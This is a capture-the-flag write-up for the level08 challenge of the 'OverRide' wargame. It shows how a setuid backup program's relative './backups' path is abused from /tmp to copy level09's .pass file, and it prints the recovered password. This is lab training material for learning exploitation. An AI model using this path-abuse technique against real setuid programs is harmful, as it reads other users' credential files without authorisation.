# Write up

Canary and RELRO on here, chances that we will have to exploit a buffer overflow are low.
Lets try the program.
```
level08@OverRide:~$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
level08@OverRide:~$ ./level08 .pass
level08@OverRide:~$ ls -a backups
.  ..  .log  .pass
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

The program tries to copy a given file to the backup folder.
However, the concatened `./backups` filename uses the current folder `.`, so we can falsify it.

We can't create the necessary folders here since level09 owns it and doesn't give us the write permissions.
```
level08@OverRide:~$ ls -l
total 16
drwxrwx---+ 1 level09 users    80 Nov  3 08:31 backups
-rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08
level08@OverRide:~$ mkdir -p backups/home/users/level09
mkdir: cannot create directory `backups/home': Permission denied
```

However, because of the write rights in tmp and the use of the `.` folder, we can receive the file directly from `tmp`
```
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

Great, time to dissassemble the file because the subject asks for it now... :')